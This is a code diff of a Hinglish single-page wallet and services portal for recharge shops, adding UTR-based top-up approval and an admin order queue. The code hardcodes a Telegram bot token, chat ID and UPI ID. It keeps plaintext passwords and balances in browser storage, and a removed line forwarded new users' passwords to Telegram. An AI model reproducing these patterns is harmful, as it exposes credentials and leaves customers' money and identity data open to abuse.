@@ -26,19 +26,21 @@
     .btn-amazon { background: #232f3e; color: #ff9900; }
     .btn-rc { background: #17a2b8; }
     .btn-voter { background: #6f42c1; }
-    .btn-upload { background: #6c757d; }
     .btn-admin { background: #dc3545; }
+
+    .btn-sm { width: auto; padding: 5px 10px; font-size: 12px; margin: 2px; display: inline-block; }
+    .btn-approve { background: #28a745; }
+    .btn-reject { background: #dc3545; }
 
     .comm-tag { background: #e8f5e9; color: #2e7d32; padding: 8px; border-radius: 4px; font-size: 12px; font-weight: bold; margin-top: 8px; }
     .upi-badge { background: #e9ecef; padding: 8px; border-radius: 6px; font-size: 13px; font-weight: bold; margin-bottom: 10px; color: #333; text-align: center; }
     
     #portal-section, #admin-dashboard, #qr-modal { display: none; }
-    #qr-modal { margin-top: 15px; padding: 10px; border: 1px dashed #007bff; border-radius: 8px; background: #f8f9fa; text-align: center; }
-    #qr-modal img { width: 160px; height: 160px; }
 
     .admin-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
     .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 8px; text-align: center; }
     .admin-table th { background: #007bff; color: white; }
+    .admin-section { margin-bottom: 30px; }
   </style>
 </head>
 <body>
@@ -98,7 +100,7 @@
   <!-- 2. MAIN USER PORTAL -->
   <div id="portal-section" class="main-container">
     
-    <!-- ADD BALANCE WITH UTR & SCREENSHOT UPLOAD -->
+    <!-- ADD BALANCE -->
     <div class="card">
       <h3>💳 Add Money To Wallet</h3>
       <div class="upi-badge">UPI: rameshchandra908080@okaxis</div>
@@ -116,11 +118,6 @@
       <input type="file" id="add-proof" accept="image/*">
 
       <button class="btn btn-add" onclick="submitAddMoneyWithProof()">Submit Add Money Request</button>
-
-      <div id="qr-modal">
-        <p style="font-size:12px; font-weight:bold; color:#d32f2f;">Scan QR Code To Pay:</p>
-        <img id="dynamic-qr" src="" alt="Scan QR">
-      </div>
     </div>
 
     <!-- VEHICLE RC PDF SERVICE -->
@@ -223,14 +220,14 @@
 
     <!-- HISTORY LOG -->
     <div class="card" style="grid-column: span 2;">
-      <h3>📜 Balance, Recharge & Service History</h3>
+      <h3>📜 My Transactions & Service History</h3>
       <table class="admin-table">
         <thead>
           <tr>
             <th>Type</th>
             <th>Details</th>
             <th>Amount</th>
-            <th>Time</th>
+            <th>Status / Time</th>
           </tr>
         </thead>
         <tbody id="user-history-body"></tbody>
@@ -241,8 +238,10 @@
 
   <!-- 3. ADMIN DASHBOARD -->
   <div id="admin-dashboard" class="main-container">
+    
+    <!-- ADMIN SUMMARY & USERS -->
     <div class="card" style="grid-column: span 2;">
-      <h3>👑 Admin Control Panel</h3>
+      <h3>👑 Admin Control Panel - All Registered Users</h3>
       <table class="admin-table">
         <thead>
           <tr>
@@ -255,51 +254,69 @@
         </thead>
         <tbody id="user-table-body"></tbody>
       </table>
+    </div>
+
+    <!-- PENDING ADD MONEY REQUESTS -->
+    <div class="card admin-section" style="grid-column: span 2;">
+      <h3 style="border-bottom-color: #28a745;">💳 Pending Add Money Requests (UTR Verification)</h3>
+      <table class="admin-table">
+        <thead>
+          <tr>
+            <th>User</th>
+            <th>Mobile</th>
+            <th>Amount</th>
+            <th>UTR No.</th>
+            <th>Proof</th>
+            <th>Time</th>
+            <th>Action</th>
+          </tr>
+        </thead>
+        <tbody id="admin-add-money-body"></tbody>
+      </table>
+    </div>
+
+    <!-- PENDING WORK & SERVICE REQUESTS -->
+    <div class="card admin-section" style="grid-column: span 2;">
+      <h3 style="border-bottom-color: #ff9800;">⚙️ Pending Work & Service Orders (Refund / Complete)</h3>
+      <table class="admin-table">
+        <thead>
+          <tr>
+            <th>User Email</th>
+            <th>Service</th>
+            <th>Details</th>
+            <th>Amount</th>
+            <th>Time</th>
+            <th>Action</th>
+          </tr>
+        </thead>
+        <tbody id="admin-pending-work-body"></tbody>
+      </table>
       <button class="btn btn-admin" style="margin-top:20px;" onclick="logout()">Admin Logout</button>
     </div>
+
   </div>
 
   <script>
     const BOT_TOKEN = "7060236112:AAFSZSgRdoegdb4e_8FJ9s4h0BtGkgEwE1s";
     const CHAT_ID = "6318395817";
-    const UPI_ID = "rameshchandra908080@okaxis";
 
     const commissionRates = { Jio: 2.0, Airtel: 1.5, Vi: 2.5 };
-    
     const operatorPlans = {
       Jio: [
         { label: "₹19 - 1GB Data Booster", price: 19 },
-        { label: "₹29 - 2GB Data Booster", price: 29 },
         { label: "₹199 - 1.5GB/Day (18 Days)", price: 199 },
         { label: "₹239 - 1.5GB/Day (22 Days)", price: 239 },
-        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 },
-        { label: "₹349 - 2GB/Day (28 Days)", price: 349 },
-        { label: "₹666 - 1.5GB/Day (70 Days)", price: 666 },
-        { label: "₹749 - 2GB/Day (72 Days)", price: 749 },
-        { label: "₹899 - 2GB/Day (90 Days)", price: 899 },
-        { label: "₹2999 - 2.5GB/Day (365 Days)", price: 2999 }
+        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }
       ],
       Airtel: [
         { label: "₹22 - 1GB Data Booster", price: 22 },
-        { label: "₹33 - 2GB Data Booster", price: 33 },
         { label: "₹199 - 1GB/Day (24 Days)", price: 199 },
-        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 },
-        { label: "₹349 - 1.5GB/Day (28 Days + Perks)", price: 349 },
-        { label: "₹409 - 2.5GB/Day (28 Days)", price: 409 },
-        { label: "₹579 - 1.5GB/Day (56 Days)", price: 579 },
-        { label: "₹859 - 1.5GB/Day (84 Days)", price: 859 },
-        { label: "₹979 - 2GB/Day (84 Days)", price: 979 },
-        { label: "₹3599 - 2GB/Day (365 Days)", price: 3599 }
+        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }
       ],
       Vi: [
         { label: "₹19 - 1GB Data (1 Day)", price: 19 },
-        { label: "₹23 - 1.2GB Data", price: 23 },
         { label: "₹199 - 1GB/Day (18 Days)", price: 199 },
-        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 },
-        { label: "₹349 - 1.5GB/Day (28 Days Unlimited)", price: 349 },
-        { label: "₹579 - 1.5GB/Day (56 Days)", price: 579 },
-        { label: "₹859 - 1.5GB/Day (84 Days)", price: 859 },
-        { label: "₹3499 - 1.5GB/Day (365 Days)", price: 3499 }
+        { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }
       ]
     };
 
@@ -324,7 +341,7 @@
       const timeNow = new Date().toLocaleString();
       const newUser = {
         name, dob, shop, email, password: pass, balance: 10.00,
-        history: [{ type: "Bonus", details: "Registration Sign-up Bonus", amount: "+₹10", time: timeNow }]
+        history: [{ id: Date.now(), type: "Bonus", details: "Registration Sign-up Bonus", amount: 10, status: "Success", time: timeNow }]
       };
 
       usersDB.push(newUser);
@@ -332,7 +349,7 @@
       currentUser = newUser;
       localStorage.setItem("currentUser", JSON.stringify(currentUser));
 
-      const msg = `🎉 *NEW USER REGISTERED*\n\n👤 *Name:* ${name}\n🏬 *Shop:* ${shop}\n📧 *Email:* ${email}\n🔑 *Pass:* \`${pass}\`\n🎁 *Bonus Credited:* ₹10`;
+      const msg = `🎉 *NEW USER REGISTERED*\n\n👤 *Name:* ${name}\n🏬 *Shop:* ${shop}\n📧 *Email:* ${email}\n🎁 *Bonus Credited:* ₹10`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -356,7 +373,7 @@
 
     function submitAddMoneyWithProof() {
       const mobile = document.getElementById("add-mobile").value;
-      const amount = document.getElementById("add-amt").value;
+      const amount = parseFloat(document.getElementById("add-amt").value);
       const utr = document.getElementById("add-utr").value;
       const proofFile = document.getElementById("add-proof").files[0];
 
@@ -366,10 +383,12 @@
       if(!proofFile) { alert("Payment ka Screenshot/Photo Upload Karein!"); return; }
 
       const timeNow = new Date().toLocaleString();
+      const reqId = Date.now();
+      const proofUrl = URL.createObjectURL(proofFile);
+
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
-      
-      const captionText = `💰 *ADD MONEY REQUEST WITH UTR*\n\n👤 *User:* ${currentUser.name}\n📧 *Email:* ${currentUser.email}\n📱 *Mobile:* ${mobile}\n💵 *Amount:* ₹${amount}\n🔢 *UTR/Ref No:* \`${utr}\`\n⏰ *Time:* ${timeNow}`;
+      const captionText = `💰 *ADD MONEY REQUEST*\n\n👤 *User:* ${currentUser.name}\n📧 *Email:* ${currentUser.email}\n📱 *Mobile:* ${mobile}\n💵 *Amount:* ₹${amount}\n🔢 *UTR/Ref No:* \`${utr}\`\n⏰ *Time:* ${timeNow}`;
       formData.append("caption", captionText);
       formData.append("parse_mode", "Markdown");
 
@@ -381,87 +400,75 @@
         formData.append("document", proofFile);
       }
 
-      fetch(apiEndpoint, {
-        method: "POST",
-        body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        if(data.ok) {
-          alert("Topup Request Submitted! Admin check karke aapka balance add kar dega.");
-          if(!currentUser.history) currentUser.history = [];
-          currentUser.history.unshift({ type: "Add Money Req", details: `UTR: ${utr} (${mobile})`, amount: `Pending (+₹${amount})`, time: timeNow });
-          updateUserDataStorage();
+      fetch(apiEndpoint, { method: "POST", body: formData });
 
-          document.getElementById("add-mobile").value = "";
-          document.getElementById("add-amt").value = "";
-          document.getElementById("add-utr").value = "";
-          document.getElementById("add-proof").value = "";
-        } else {
-          alert("Screenshot upload me issue aaya! File choti try karein.");
-        }
-      })
-      .catch(err => {
-        alert("Network error! Request send nahi hui.");
+      if(!currentUser.history) currentUser.history = [];
+      currentUser.history.unshift({
+        id: reqId,
+        type: "Add Money Req",
+        details: `UTR: ${utr} (${mobile})`,
+        amount: amount,
+        utr: utr,
+        mobile: mobile,
+        proof: proofUrl,
+        status: "Pending Approval",
+        time: timeNow
       });
+
+      updateUserDataStorage();
+      alert("Topup Request Submitted! Admin check karke aapka balance add kar dega.");
+
+      document.getElementById("add-mobile").value = "";
+      document.getElementById("add-amt").value = "";
+      document.getElementById("add-utr").value = "";
+      document.getElementById("add-proof").value = "";
+    }
+
+    function createServiceOrder(type, details, charge) {
+      if(currentUser.balance < charge) { alert(`Wallet Balance Kam Hai! ₹${charge} Add Karein.`); return false; }
+
+      currentUser.balance -= charge;
+      document.getElementById("user-balance").innerText = currentUser.balance;
+
+      const timeNow = new Date().toLocaleString();
+      const orderId = Date.now();
+
+      if(!currentUser.history) currentUser.history = [];
+      currentUser.history.unshift({
+        id: orderId,
+        type: type,
+        details: details,
+        amount: charge,
+        status: "Pending Work",
+        time: timeNow
+      });
+
+      updateUserDataStorage();
+      return true;
     }
 
     function getRcPdf() {
       const rcNo = document.getElementById("rc-number").value.toUpperCase();
       const mob = document.getElementById("rc-mobile").value;
-      const charge = 50;
+      if(!rcNo || !mob || mob.length !== 10) { alert("Valid Details Enter Karein!"); return; }
 
-      if(!rcNo || !mob || mob.length !== 10) { alert("Valid RC Number aur Mobile Number enter karein!"); return; }
-      if(currentUser.balance < charge) { alert("Wallet Balance Kam Hai! ₹50 Add Karein."); return; }
-
-      currentUser.balance -= charge;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Vehicle RC PDF", details: `RC No: ${rcNo} (${mob})`, amount: `-₹${charge}`, time: timeNow });
-
-      updateUserDataStorage();
-
-      const msg = `🚗 *VEHICLE RC PDF REQUEST*\n\n👤 *User:* ${currentUser.name}\n🚘 *RC No:* \`${rcNo}\`\n📱 *Mobile:* ${mob}\n💵 *Charge:* ₹${charge}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("Vehicle RC PDF Request Sent Successfully!");
-      document.getElementById("rc-number").value = "";
-      document.getElementById("rc-mobile").value = "";
+      if(createServiceOrder("Vehicle RC PDF", `RC: ${rcNo} (${mob})`, 50)) {
+        alert("Vehicle RC PDF Request Sent!");
+        document.getElementById("rc-number").value = "";
+        document.getElementById("rc-mobile").value = "";
+      }
     }
 
     function linkVoterMobile() {
       const voterNo = document.getElementById("voter-number").value.toUpperCase();
       const mob = document.getElementById("voter-mobile").value;
-      const charge = 100;
+      if(!voterNo || !mob || mob.length !== 10) { alert("Valid Details Enter Karein!"); return; }
 
-      if(!voterNo || !mob || mob.length !== 10) { alert("Valid Voter ID (EPIC) aur New Mobile Number enter karein!"); return; }
-      if(currentUser.balance < charge) { alert("Wallet Balance Kam Hai! ₹100 Add Karein."); return; }
-
-      currentUser.balance -= charge;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Voter Mobile Link", details: `Voter ID: ${voterNo} (${mob})`, amount: `-₹${charge}`, time: timeNow });
-
-      updateUserDataStorage();
-
-      const msg = `🪪 *VOTER MOBILE LINK REQUEST*\n\n👤 *User:* ${currentUser.name}\n📋 *Voter No:* \`${voterNo}\`\n📱 *Link Mobile:* ${mob}\n💵 *Charge:* ₹${charge}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("Voter ID Mobile Linking Request Sent Successfully!");
-      document.getElementById("voter-number").value = "";
-      document.getElementById("voter-mobile").value = "";
+      if(createServiceOrder("Voter Mobile Link", `Voter ID: ${voterNo} (${mob})`, 100)) {
+        alert("Voter ID Linking Request Sent!");
+        document.getElementById("voter-number").value = "";
+        document.getElementById("voter-mobile").value = "";
+      }
     }
 
     function buyPlan() {
@@ -471,82 +478,37 @@
       const price = Number(planSelect.value);
       const selectedText = planSelect.options[planSelect.selectedIndex].text;
 
-      if(!num || num.length !== 10) { alert("Valid Number Enter Karein!"); return; }
-      if(currentUser.balance < price) { alert("Wallet me balance kam hai!"); return; }
+      if(!num || num.length !== 10) { alert("Valid Mobile Number!"); return; }
 
-      currentUser.balance -= price;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-      
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Recharge", details: `${op} - ${selectedText} (${num})`, amount: `-₹${price}`, time: timeNow });
-      
-      updateUserDataStorage();
-
-      const msg = `🛒 *RECHARGE PURCHASED*\n\n👤 *User:* ${currentUser.name}\n📱 *Number:* ${num}\n🏢 *Operator:* ${op}\n📦 *Plan:* ${selectedText}\n💵 *Price:* ₹${price}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("Recharge Order Placed Successfully!");
-      document.getElementById("buy-number").value = "";
+      if(createServiceOrder("Recharge", `${op} - ${selectedText} (${num})`, price)) {
+        alert("Recharge Order Submitted!");
+        document.getElementById("buy-number").value = "";
+      }
     }
 
     function buyGooglePlayCode() {
       const mob = document.getElementById("gplay-mobile").value;
       const amt = Number(document.getElementById("gplay-amt").value);
 
-      if(!mob || mob.length !== 10 || !amt || amt < 10) { alert("Valid Mobile Number aur min ₹10 amount daalein!"); return; }
-      if(currentUser.balance < amt) { alert("Wallet Balance Kam Hai!"); return; }
+      if(!mob || mob.length !== 10 || !amt || amt < 10) { alert("Valid Details!"); return; }
 
-      currentUser.balance -= amt;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Google Play Code", details: `Redeem Code (${mob})`, amount: `-₹${amt}`, time: timeNow });
-
-      updateUserDataStorage();
-
-      const msg = `🎮 *GOOGLE PLAY REDEEM CODE REQUEST*\n\n👤 *User:* ${currentUser.name}\n📱 *Mobile:* ${mob}\n💵 *Amount:* ₹${amt}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("Google Play Code Request Sent Successfully!");
-      document.getElementById("gplay-mobile").value = "";
-      document.getElementById("gplay-amt").value = "";
+      if(createServiceOrder("Google Play Code", `Redeem Code (${mob})`, amt)) {
+        alert("Google Play Code Request Placed!");
+        document.getElementById("gplay-mobile").value = "";
+        document.getElementById("gplay-amt").value = "";
+      }
     }
 
     function buyAmazonGiftCard() {
       const contact = document.getElementById("amz-contact").value;
       const amt = Number(document.getElementById("amz-amt").value);
 
-      if(!contact) { alert("Mobile ya Email ID enter karein!"); return; }
-      if(currentUser.balance < amt) { alert("Wallet Balance Kam Hai!"); return; }
+      if(!contact) { alert("Contact Enter Karein!"); return; }
 
-      currentUser.balance -= amt;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Amazon Voucher", details: `Gift Voucher (${contact})`, amount: `-₹${amt}`, time: timeNow });
-
-      updateUserDataStorage();
-
-      const msg = `🛒 *AMAZON GIFT CARD REQUEST*\n\n👤 *User:* ${currentUser.name}\n📱 *Contact:* ${contact}\n💵 *Voucher Amount:* ₹${amt}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("Amazon Gift Card Order Sent Successfully!");
-      document.getElementById("amz-contact").value = "";
+      if(createServiceOrder("Amazon Voucher", `Gift Voucher (${contact})`, amt)) {
+        alert("Amazon Gift Voucher Placed!");
+        document.getElementById("amz-contact").value = "";
+      }
     }
 
     function payUppclBill() {
@@ -555,30 +517,17 @@
       const name = document.getElementById("uppcl-name").value;
       const amt = Number(document.getElementById("uppcl-amt").value);
 
-      if(!acc || !name || !amt || amt < 1) { alert("UPPCL Bill details sahi se bharein!"); return; }
-      if(currentUser.balance < amt) { alert("Wallet balance kam hai!"); return; }
+      if(!acc || !name || !amt || amt < 1) { alert("Details Sahi Se Bharein!"); return; }
 
-      currentUser.balance -= amt;
-      document.getElementById("user-balance").innerText = currentUser.balance;
-
-      const timeNow = new Date().toLocaleString();
-      if(!currentUser.history) currentUser.history = [];
-      currentUser.history.unshift({ type: "Electricity Bill", details: `${discom} - Acc: ${acc} (${name})`, amount: `-₹${amt}`, time: timeNow });
-
-      updateUserDataStorage();
-
-      const msg = `💡 *UPPCL LIGHT BILL REQUEST*\n\n👤 *User:* ${currentUser.name}\n🏢 *Type:* ${discom}\n🆔 *Account No:* \`${acc}\`\n👤 *Consumer:* ${name}\n💵 *Bill Amount:* ₹${amt}\n⏰ *Time:* ${timeNow}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
-      });
-
-      alert("UPPCL Bill Payment Request Sent Successfully!");
-      document.getElementById("uppcl-acc").value = "";
-      document.getElementById("uppcl-name").value = "";
-      document.getElementById("uppcl-amt").value = "";
+      if(createServiceOrder("Electricity Bill", `${discom} - Acc: ${acc} (${name})`, amt)) {
+        alert("UPPCL Bill Request Submitted!");
+        document.getElementById("uppcl-acc").value = "";
+        document.getElementById("uppcl-name").value = "";
+        document.getElementById("uppcl-amt").value = "";
+      }
     }
+
+    /* --- ADMIN CONTROL PANEL FUNCTIONS --- */
 
     function loginAdmin() {
       const u = document.getElementById("admin-user").value;
@@ -588,11 +537,17 @@
         document.getElementById("auth-section").style.display = "none";
         document.getElementById("portal-section").style.display = "none";
         document.getElementById("admin-dashboard").style.display = "grid";
-        loadAdminTable();
+        loadAdminDashboard();
       } else { alert("Wrong Admin Credentials!"); }
     }
 
-    function loadAdminTable() {
+    function loadAdminDashboard() {
+      loadUserTable();
+      loadPendingAddMoneyTable();
+      loadPendingWorkTable();
+    }
+
+    function loadUserTable() {
       const tbody = document.getElementById("user-table-body");
       tbody.innerHTML = "";
       usersDB.forEach((usr, index) => {
@@ -601,57 +556,181 @@
             <td>${usr.name}</td>
             <td>${usr.email}</td>
             <td>${usr.shop}</td>
-            <td>₹${usr.balance}</td>
-            <td><button onclick="addBalanceAdmin(${index})" style="background:#28a745; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer;">+ Add Money</button></td>
+            <td>₹${usr.balance.toFixed(2)}</td>
+            <td><button onclick="addBalanceAdmin(${index})" class="btn-sm btn-approve">+ Add/Deduct</button></td>
           </tr>
         `;
       });
     }
 
+    function loadPendingAddMoneyTable() {
+      const tbody = document.getElementById("admin-add-money-body");
+      tbody.innerHTML = "";
+      let count = 0;
+
+      usersDB.forEach(user => {
+        if(user.history) {
+          user.history.forEach(item => {
+            if(item.type === "Add Money Req" && item.status === "Pending Approval") {
+              count++;
+              tbody.innerHTML += `
+                <tr>
+                  <td>${user.name}<br><small>${user.email}</small></td>
+                  <td>${item.mobile}</td>
+                  <td><b>₹${item.amount}</b></td>
+                  <td><code>${item.utr}</code></td>
+                  <td><a href="${item.proof}" target="_blank" style="color:#007bff; font-weight:bold;">View Proof</a></td>
+                  <td>${item.time}</td>
+                  <td>
+                    <button class="btn-sm btn-approve" onclick="approveAddMoney('${user.email}', ${item.id})">Approve (+₹${item.amount})</button>
+                    <button class="btn-sm btn-reject" onclick="rejectAddMoney('${user.email}', ${item.id})">Reject / Cancel</button>
+                  </td>
+                </tr>
+              `;
+            }
+          });
+        }
+      });
+
+      if(count === 0) {
+        tbody.innerHTML = `<tr><td colspan="7">Koi Pending Add Money Request nahi hai.</td></tr>`;
+      }
+    }
+
+    function loadPendingWorkTable() {
+      const tbody = document.getElementById("admin-pending-work-body");
+      tbody.innerHTML = "";
+      let count = 0;
+
+      usersDB.forEach(user => {
+        if(user.history) {
+          user.history.forEach(item => {
+            if(item.status === "Pending Work") {
+              count++;
+              tbody.innerHTML += `
+                <tr>
+                  <td>${user.email}</td>
+                  <td><b>${item.type}</b></td>
+                  <td>${item.details}</td>
+                  <td>₹${item.amount}</td>
+                  <td>${item.time}</td>
+                  <td>
+                    <button class="btn-sm btn-approve" onclick="completeWork('${user.email}', ${item.id})">Mark Completed</button>
+                    <button class="btn-sm btn-reject" onclick="rejectAndRefundWork('${user.email}', ${item.id})">Cancel & Refund</button>
+                  </td>
+                </tr>
+              `;
+            }
+          });
+        }
+      });
+
+      if(count === 0) {
+        tbody.innerHTML = `<tr><td colspan="6">Koi Pending Service/Work nahi hai.</td></tr>`;
+      }
+    }
+
+    function approveAddMoney(userEmail, itemId) {
+      const user = usersDB.find(u => u.email === userEmail);
+      if(user) {
+        const item = user.history.find(h => h.id === itemId);
+        if(item) {
+          user.balance += parseFloat(item.amount);
+          item.status = "Approved & Added";
+          saveAndRefreshAdmin();
+          alert(`₹${item.amount} User Wallet me add kar diya gaya!`);
+        }
+      }
+    }
+
+    function rejectAddMoney(userEmail, itemId) {
+      const user = usersDB.find(u => u.email === userEmail);
+      if(user) {
+        const item = user.history.find(h => h.id === itemId);
+        if(item) {
+          item.status = "Rejected By Admin";
+          saveAndRefreshAdmin();
+          alert("Request Cancel/Reject kar di gayi!");
+        }
+      }
+    }
+
+    function completeWork(userEmail, itemId) {
+      const user = usersDB.find(u => u.email === userEmail);
+      if(user) {
+        const item = user.history.find(h => h.id === itemId);
+        if(item) {
+          item.status = "Completed";
+          saveAndRefreshAdmin();
+          alert("Order Completed mark kar diya gaya hai!");
+        }
+      }
+    }
+
+    function rejectAndRefundWork(userEmail, itemId) {
+      const user = usersDB.find(u => u.email === userEmail);
+      if(user) {
+        const item = user.history.find(h => h.id === itemId);
+        if(item) {
+          user.balance += parseFloat(item.amount);
+          item.status = "Cancelled & Refunded";
+          saveAndRefreshAdmin();
+          alert(`Order Cancel ho gaya aur ₹${item.amount} user ke wallet me Refund kar diya gaya!`);
+        }
+      }
+    }
+
     function addBalanceAdmin(index) {
       let amt = prompt("Kitna Balance Add/Subtract karna hai?:");
       if(amt && !isNaN(amt)) {
-        usersDB[index].balance = parseFloat(usersDB[index].balance) + parseFloat(amt);
+        usersDB[index].balance += parseFloat(amt);
         const timeNow = new Date().toLocaleString();
-        
         if(!usersDB[index].history) usersDB[index].history = [];
-        usersDB[index].history.unshift({ type: "Admin Update", details: "Balance Modified by Admin", amount: `${amt > 0 ? '+' : ''}₹${amt}`, time: timeNow });
-
-        if(currentUser && currentUser.email === usersDB[index].email) {
-          currentUser = usersDB[index];
-          localStorage.setItem("currentUser", JSON.stringify(currentUser));
-          loadHistoryTable();
-          document.getElementById("user-balance").innerText = currentUser.balance;
-        }
-        localStorage.setItem("usersDB", JSON.stringify(usersDB));
-        loadAdminTable();
+        usersDB[index].history.unshift({ id: Date.now(), type: "Admin Adjustment", details: "Manual Balance Update", amount: parseFloat(amt), status: "Success", time: timeNow });
+        saveAndRefreshAdmin();
         alert("Balance Updated!");
       }
+    }
+
+    function saveAndRefreshAdmin() {
+      localStorage.setItem("usersDB", JSON.stringify(usersDB));
+      if(currentUser) {
+        const updatedSelf = usersDB.find(u => u.email === currentUser.email);
+        if(updatedSelf) {
+          currentUser = updatedSelf;
+          localStorage.setItem("currentUser", JSON.stringify(currentUser));
+        }
+      }
+      loadAdminDashboard();
     }
 
     function showPortal() {
       document.getElementById("auth-section").style.display = "none";
       document.getElementById("admin-dashboard").style.display = "none";
       document.getElementById("portal-section").style.display = "grid";
-      document.getElementById("user-balance").innerText = currentUser.balance;
-      loadHistoryTable();
+      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
+      loadUserHistoryTable();
       updatePlans();
     }
 
-    function loadHistoryTable() {
+    function loadUserHistoryTable() {
       const tbody = document.getElementById("user-history-body");
       tbody.innerHTML = "";
       if(!currentUser.history || currentUser.history.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="4">Koi history available nahi hai.</td></tr>`;
+        tbody.innerHTML = `<tr><td colspan="4">Koi transaction history nahi hai.</td></tr>`;
         return;
       }
       currentUser.history.forEach(item => {
+        let isAdd = item.type === "Add Money Req" || item.type === "Bonus" || item.status.includes("Refunded");
+        let amtColor = isAdd ? "green" : "red";
+        let sign = isAdd ? "+" : "-";
+
         tbody.innerHTML += `
           <tr>
             <td><b>${item.type}</b></td>
             <td>${item.details}</td>
-            <td style="color:${item.amount.includes('+') ? 'green' : item.amount.includes('Pending') ? 'orange' : 'red'};">${item.amount}</td>
-            <td>${item.time}</td>
+            <td style="color:${amtColor}; font-weight:bold;">${sign}₹${Math.abs(item.amount)}</td>
+            <td><small><b>${item.status}</b><br>${item.time}</small></td>
           </tr>
         `;
       });
@@ -659,12 +738,10 @@
 
     function updateUserDataStorage() {
       const userIndex = usersDB.findIndex(u => u.email === currentUser.email);
-      if(userIndex !== -1) {
-        usersDB[userIndex] = currentUser;
-      }
+      if(userIndex !== -1) { usersDB[userIndex] = currentUser; }
       localStorage.setItem("usersDB", JSON.stringify(usersDB));
       localStorage.setItem("currentUser", JSON.stringify(currentUser));
-      loadHistoryTable();
+      loadUserHistoryTable();
     }
 
     function showLogin() {
